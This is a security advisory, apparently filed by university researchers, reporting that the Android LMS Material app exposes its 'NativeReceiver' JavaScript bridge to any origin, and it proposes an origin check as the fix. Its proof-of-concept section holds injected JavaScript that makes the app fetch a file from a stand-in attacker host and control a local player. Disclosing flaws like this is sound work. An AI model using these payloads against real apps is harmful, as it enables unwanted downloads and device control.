# No Origin Validation on JavaScript Bridge (`NativeReceiver`)

## Detection note

This issue was identified through automated LLM-based static analysis of WebView `addJavascriptInterface` bridges, as part of academic security research at the University of Southern Denmark (SDU) in the context of a masters level course named Engineering in Research.

The finding was manually reviewed before submission.

To aid the purposes of our research, we would kindly request acknowledgement of the reported issue as well as a final verdict from the open source community working on this repository, even if the issue is not acted on.

We are reporting in good faith and are happy to answer questions.

## Summary

The `NativeReceiver` JavaScript bridge is registered without any per-call origin validation. All `@JavascriptInterface` methods — including `download()`, `controlLocalPlayerPower()`, and UI manipulation methods — are accessible to any JavaScript executing in the WebView regardless of origin. If the LMS web page contains an XSS vulnerability, an attacker gains the ability to invoke all bridge methods including triggering file downloads and sending broadcast intents.

**Severity:** Medium
**Affected version(s):** v0.9.2 (latest at time of analysis)

---

## Affected file(s)

- `lms-material/src/main/java/com/craigd/lmsmaterial/app/MainActivity.java` — bridge registration (line 577), all `@JavascriptInterface` methods (line 774–928)

---

## Vulnerable code

```java
// Bridge registered with no domain restriction
webView.addJavascriptInterface(this, "NativeReceiver");

// Example exposed method — no origin check
@JavascriptInterface
public void download(String str) {
    // processes str immediately without checking webView.getUrl()
}
```

---

## Proof of concept

```js
// From XSS in LMS web UI:
NativeReceiver.download('[{"url":"http://attacker.com/file","filename":"evil","artist":"..","album":".."}]');
NativeReceiver.controlLocalPlayerPower("playerName", "power", 0);
```

---

## Impact

An XSS in the LMS web UI grants an attacker full access to all bridge methods without any further precondition. Consequences include: triggering file downloads to external storage (potentially combined with path traversal), sending broadcast intents to control local audio players, and UI manipulation. Exploitability is bounded by the LMS server trust boundary, but the absence of origin checks means any XSS has immediate bridge access.

---

## Suggested mitigation

Validate the WebView's current URL against the configured LMS server inside each bridge method before processing:

```java
@JavascriptInterface
public void download(String str) {
    if (!isTrustedOrigin(webView.getUrl())) return;
    doDownload(str);
}

private boolean isTrustedOrigin(String url) {
    // Compare host and port against LMS server address from SharedPreferences
    Uri current = Uri.parse(url);
    Uri server = Uri.parse(getServerUrl());
    return Objects.equals(current.getHost(), server.getHost())
        && current.getPort() == server.getPort();
}
```
